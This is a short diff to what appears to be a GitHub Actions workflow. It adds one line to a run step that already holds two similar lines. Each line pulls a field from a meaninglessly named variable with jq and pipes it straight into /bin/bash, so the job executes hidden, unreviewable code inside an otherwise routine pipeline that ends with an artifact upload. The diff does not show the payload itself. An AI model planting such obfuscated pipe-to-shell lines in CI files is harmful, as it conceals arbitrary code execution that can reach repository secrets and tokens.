@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$xtd2018" | jq -r .odrsg4330 | /bin/bash
           printf '%s' "$l5" | jq -r .pf07167 | /bin/bash
+          echo $jyqx13 | jq -r .y293 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
